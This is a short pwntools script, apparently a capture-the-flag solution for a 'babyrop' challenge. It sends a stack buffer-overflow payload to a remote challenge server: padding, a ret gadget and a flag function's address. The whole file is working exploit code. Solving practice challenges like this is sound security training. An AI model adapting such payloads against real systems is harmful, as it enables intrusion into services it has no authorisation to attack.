#!/usr/bin/env python3

from pwn import *

# p = process(["./babyrop"])

# p = process(["gdb", "./babyrop"])
# p.recvuntil(b"(gdb) ")
# p.sendline(b'r')

p = remote("puzzler7.com", 10003)

flag_addr = 0x40122a # gdb babyrop; p flag
ret_addr = 0x40101a # ROPgadget --binary babyrop
payload = b'A'*72 + p64(ret_addr) + p64(flag_addr)

p.sendline(payload)
p.interactive()
